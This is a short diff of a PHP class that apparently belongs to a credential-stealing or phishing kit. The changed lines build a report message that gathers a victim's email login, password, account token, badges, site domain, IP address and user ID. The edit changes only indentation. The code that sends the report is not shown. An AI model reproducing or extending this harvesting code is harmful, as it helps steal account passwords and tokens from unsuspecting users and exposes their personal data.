@@ -290,7 +290,7 @@ class Main
             "📪 Mail: ".$login."%0A".
             "📝 Pass: ".$password."%0A"."%0A".
             "💎 Token: ".$acc_token."%0A"."%0A".
-			"✨ Badges (".$howmuchbadges."): ".$badges."%0A"."%0A".
+	    "✨ Badges (".$howmuchbadges."): ".$badges."%0A"."%0A".
             "🌐 Domain: ".$full_url."%0A".
             "🏘 IP-adress: ".$client_ip." (".$flag.")"."%0A"."%0A".
             "🙆 ID user: ".$user_id[0];
